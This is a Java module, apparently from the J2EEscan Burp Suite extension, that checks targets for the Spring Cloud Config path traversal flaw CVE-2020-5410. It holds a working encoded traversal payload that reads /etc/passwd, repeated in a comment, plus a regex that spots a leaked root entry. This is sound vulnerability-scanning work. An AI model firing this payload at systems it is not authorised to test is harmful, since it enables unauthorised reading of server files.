
package burp.j2ee.issues.impl;

import burp.CustomHttpRequestResponse;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.apache.commons.lang3.StringUtils;

/**
 *
 * Spring Cloud Config Path Traversal
 *
 *
 *
 * References:
 *  - https://tanzu.vmware.com/security/cve-2020-5410
 * 
 */
public class SpringCloudConfigPathTraversal implements IModule {

    private static final String TITLE = "Spring Cloud Config Path Traversal - CVE-2020-5410";
    private static final String DESCRIPTION = "J2EEscan identified a Path Traversal vulnerability; "
            + "Spring Cloud Config allow applications to serve arbitrary configuration files through the spring-cloud-config-server module. <br />"
            + "A malicious user, or attacker, can send a request using a specially crafted URL that can lead to a directory traversal attack.<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "https://tanzu.vmware.com/security/cve-2020-5410<br />"
            + "https://cloud.spring.io/spring-cloud-config/multi/multi__spring_cloud_config_server.html#_security";

    private static final String REMEDY = "Update the remote vulnerable component";

    private PrintWriter stderr;
    private PrintWriter stdout;

    private static final List<String> SPRINGCLOUD_TRAVERSALS = Arrays.asList(
            "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23"
    );

    private static final Map<String, Pattern> LFI_RESOURCES = new HashMap<String, Pattern>() {
        {
            put("etc/passwd", Pattern.compile("root:.*:0:[01]:", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));
        }
    };

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        List<IScanIssue> issues = new ArrayList<>();

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        stdout = new PrintWriter(callbacks.getStdout(), true);

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
 
        String path = url.getPath();
         String protocol = url.getProtocol();
        Boolean isSSL = (protocol.equals("https"));

        /**
         * Path Traversal on the application context
         *
         * Ex: http://www.example.com/myapp/Login
         *
         * Retrieve the myapp context and test the LFI payloads on it
         *
         * Ex:
         * http://www.example.com/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd#myapp/Login
         */

        if (path.isEmpty()) {
            return issues;
        }

        List<String> toTest = new ArrayList();
        for (String traversalPath : SPRINGCLOUD_TRAVERSALS) {
            toTest.add(traversalPath + StringUtils.replaceOnce(path, "/", ""));
        }

        
        
        if (!toTest.isEmpty()) {

            for (String systemPath : toTest) {

                Set<String> lfiOSResources = LFI_RESOURCES.keySet();

                for (String osResource : lfiOSResources) {

                    try {

 
                        URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), systemPath);
                        byte[] utf8LFIAttempt = helpers.buildHttpRequest(urlToTest);

                        byte[] responseBytes = callbacks.makeHttpRequest(url.getHost(),
                                url.getPort(), isSSL, utf8LFIAttempt);

                        String response = helpers.bytesToString(responseBytes);

                        Pattern detectionRule = LFI_RESOURCES.get(osResource);

                        Matcher matcher = detectionRule.matcher(response);
                        if (matcher.find()) {
                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    urlToTest,
                                    new CustomHttpRequestResponse(utf8LFIAttempt, responseBytes, baseRequestResponse.getHttpService()),
                                    TITLE,
                                    DESCRIPTION,
                                    REMEDY,
                                    Risk.High,
                                    Confidence.Certain));
                            return issues;
                        }

                    } catch (MalformedURLException ex) {
                        stderr.println(ex);
                    } catch (Exception ex) {
                        stderr.println(ex);
                    }
                }
            }
        }

        return issues;
    }

}
